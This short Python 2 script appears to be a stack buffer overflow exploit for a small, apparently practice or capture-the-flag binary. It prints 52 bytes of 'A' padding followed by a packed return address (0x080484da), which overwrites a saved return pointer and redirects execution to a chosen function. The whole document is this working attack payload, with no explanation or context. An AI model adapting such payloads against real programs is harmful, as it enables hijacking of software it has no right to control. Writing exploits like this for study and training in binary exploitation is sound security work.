import struct
padding = "A" * 52
printAddress = struct.pack("I", 0x080484da)
print padding+printAddress
